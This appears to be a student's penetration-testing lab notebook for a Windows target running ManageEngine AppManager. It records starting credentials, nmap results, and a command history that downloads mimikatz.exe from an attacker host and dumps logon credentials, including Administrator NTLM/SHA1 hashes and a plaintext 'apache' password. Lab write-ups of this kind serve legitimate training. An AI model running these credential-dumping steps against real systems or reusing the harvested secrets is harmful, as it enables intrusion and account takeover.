# VM 3 192.168.x.95
# Accounts
	Eric.Wallows / EricLikesRunning800
# Flag Location
	C:\Users\Administrator\Desktop\proof.txt
# Enumeration
## NMAP
`sudo nmap -sV 192.168.141.95 --top-ports 100`

```
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
8443/tcp open  ssl/https-alt AppManager
```
## XXX
# Services    
	http://192.168.141.95:44444/index.do -> ManageEngine App Manager

## Command History
```
    Invoke-WebRequest -Uri "http://192.168.45.219/mimikatz.exe" -OutFile "mimikatz.exe"
    mimikatz
    -> riviliege::debug
    -> token::elevate
    -> sekursa::logonpasswords
        Authentication Id : 0 ; 712535 (00000000:000adf57)
        Session           : Interactive from 1
        User Name         : Administrator
        Domain            : SECURE
        Logon Server      : SECURE
        Logon Time        : 2/20/2025 9:58:06 PM
        SID               : S-1-5-21-3197578891-1085383791-1901100223-500
                msv :
                [00000003] Primary
                * Username : Administrator
                * Domain   : SECURE
                * NTLM     : a51493b0b06e5e35f855245e71af1d14
                * SHA1     : 02fb73dd0516da435ac4681bda9cbed3c128e1aa
                tspkg :
                wdigest :
                * Username : Administrator
                * Domain   : SECURE
                * Password : (null)
                kerberos :
                * Username : Administrator
                * Domain   : SECURE
                * Password : (null)
                ssp :
                credman :
                [00000000]
                * Username : apache
                * Domain   : era.secura.local
                * Password : New2Era4.!
                cloudap :
```